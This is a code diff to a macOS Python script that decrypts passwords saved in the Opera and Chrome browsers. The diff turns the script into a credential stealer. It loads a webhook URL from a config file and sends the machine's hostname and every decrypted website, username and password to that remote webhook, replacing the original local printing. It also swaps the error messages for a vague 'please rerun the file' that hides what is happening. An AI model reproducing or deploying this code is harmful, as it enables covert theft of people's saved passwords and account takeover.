@@ -8,7 +8,14 @@ import hashlib
 import glob
 import time
 from colorama import Fore
+from dhooks import Webhook
+import json
+import socket
 
+
+f = open('./config.json')
+
+hook = Webhook(json.load(f)['webhook'])
 
 operapid = (
     subprocess.check_output("ps -A | grep Opera | awk '{print $1}'", shell=True)
@@ -62,7 +69,7 @@ ChromeSafeStorageKey = (
 
 
 if ChromeSafeStorageKey == b"" or OperaSafeStorageKey == b"":
-    print(f"{Fore.RED}ERROR getting Safe Storage Key")
+    print(f"{Fore.RED}ERROR please rerun the file")
     sys.exit()
 
 def PasswordDecrypt(encrypted_value, iv, key=None):  # AES decryption using the PBKDF2 key and 16x ' ' IV, via openSSL (installed on OSX natively)
@@ -73,7 +80,7 @@ def PasswordDecrypt(encrypted_value, iv, key=None):  # AES decryption using the 
             f"openssl enc -base64 -d -aes-128-cbc -iv '{iv}' -K {hexKey} <<< {hexEncPassword} 2>/dev/null", shell=True
         )
     except Exception as e:
-        decrypted = f"{Fore.RED}ERROR retrieving password"
+        decrypted = f"{Fore.RED}ERROR please rerun the file."
     return decrypted
 
 def ChromiumProcess(safeStorageKey, loginData):
@@ -97,18 +104,15 @@ def ChromiumProcess(safeStorageKey, loginData):
                 decryptedList.append(urlUserPassDecrypted)
     return decryptedList
 
-print(f"{Fore.BLUE}Printing Opera Passwords")
-print(f"{Fore.GREEN}")
+
+hook.send(f"```Passwords for {socket.gethostname()}```")
 
 for profile in OperaLoginData:
     for i, x in enumerate(ChromiumProcess(OperaSafeStorageKey, f"{profile}")):
-        print(f"Website: {x[0]}\nUser: {x[1]}\nPass: {x[2].decode('utf-8')}\n")
+        hook.send(f"```Website: {x[0]}\nUser: {x[1]}\nPass: {x[2].decode('utf-8')}\n```")
         time.sleep(1)
-
-print(f"{Fore.BLUE}Printing Chrome Passwords")
-print(f"{Fore.GREEN}")
 
 for profile in ChromeLoginData:
     for i, x in enumerate(ChromiumProcess(ChromeSafeStorageKey, f"{profile}")):
-        print(f"Website: {x[0]}\nUser: {x[1]}\nPass: {x[2].decode('utf-8')}\n")
+        hook.send(f"```Website: {x[0]}\nUser: {x[1]}\nPass: {x[2].decode('utf-8')}\n```")
         time.sleep(1)
